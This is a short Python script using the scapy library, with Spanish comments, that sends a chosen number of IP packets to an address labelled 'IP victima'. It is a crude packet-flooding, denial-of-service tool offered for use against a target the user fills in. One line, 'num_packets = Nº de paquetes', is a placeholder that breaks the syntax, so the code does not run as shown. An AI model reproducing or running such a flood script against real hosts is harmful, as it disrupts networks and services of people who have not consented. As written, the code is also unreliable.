from scapy.all import *

# Dirección IP del servidor de destino (Tiene que poner la IP victima, 'no borre las comillas')
server_ip = 'IP victima'

# Número de paquetes a enviar (Tiene que poner la cantidad de paquetes que quiere enviar)
num_packets = Nº de paquetes

# Crear paquetes IP con la dirección del servidor de destino
packets = IP(dst=server_ip)

# Enviar los paquetes al servidor de destino
send(packets, count=num_packets)
